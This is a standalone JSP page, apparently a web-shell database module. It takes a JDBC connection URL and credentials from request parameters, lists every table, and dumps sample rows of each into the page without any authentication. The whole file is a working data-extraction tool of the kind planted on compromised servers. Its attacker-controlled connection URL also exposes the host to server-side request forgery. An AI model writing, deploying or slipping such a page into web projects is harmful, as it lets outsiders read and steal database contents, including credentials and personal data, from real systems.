<%@ page import="java.sql.*" %>
<%
try {
    Class.forName("com.mysql.cj.jdbc.Driver");
    Connection c = DriverManager.getConnection(request.getParameter("u"), request.getParameter("n"), request.getParameter("p"));
    Statement s = c.createStatement();
    ResultSet rs = s.executeQuery("SHOW TABLES");
    while (rs.next()) {
        String t = rs.getString(1);
        out.println("<b>[Table: " + t + "]</b><br>");
        try {
            Statement s2 = c.createStatement();
            ResultSet r2 = s2.executeQuery("SELECT * FROM " + t + " LIMIT 3");
            ResultSetMetaData md = r2.getMetaData();
            int cols = md.getColumnCount();
            while(r2.next()) {
                for(int i=1; i<=cols; i++) out.print(md.getColumnName(i) + "=" + r2.getString(i) + " | ");
                out.println("<br>");
            }
            r2.close(); s2.close();
        } catch(Exception e) { out.println("Error reading table " + t + ": " + e.getMessage() + "<br>"); }
    }
    rs.close(); s.close(); c.close();
} catch(Exception e) { out.println("DB Connection Error: " + e.getMessage()); }
%>